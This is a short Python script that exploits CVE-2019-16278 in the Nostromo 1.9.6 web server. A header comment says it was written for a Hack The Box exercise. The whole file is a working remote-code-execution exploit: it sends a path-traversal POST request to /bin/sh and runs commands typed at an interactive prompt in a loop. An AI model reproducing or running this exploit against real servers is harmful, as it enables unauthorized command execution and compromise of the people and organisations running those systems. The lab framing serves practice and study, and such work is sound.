#!/usr/bin/env python
#
# smashed by N4pst3r (@ludovicoloreti) for htb
# cve for nostromo 1.9.6
#

import socket
import argparse

parser = argparse.ArgumentParser(description='Nostromo RCE (cve2019-16278)')
parser.add_argument('host',help='IP')
parser.add_argument('port',help='Port',type=int)
args = parser.parse_args()

def recv(s):
	res=''
	try:
		while True:
			temp = s.recv(1024)
			if len(temp)==0:
				break
			res+=temp
	except:
		pass
	return res
def exploit(host,port):
	cmd = raw_input("# ")
	payload="POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1".format(cmd)
	sockInstance = socket.socket()
	sockInstance.settimeout(10) # connect to vpn XD
	sockInstance.connect((host,int(port)))
	sockInstance.send(payload)
	result=recv(sockInstance)
	if result.startswith('HTTP/1.1 200 OK'):
		print(result).split('\n',4)[4] # print only command results
	else:
		print(result)
	sockInstance.close()

while True:
	exploit(args.host,args.port)
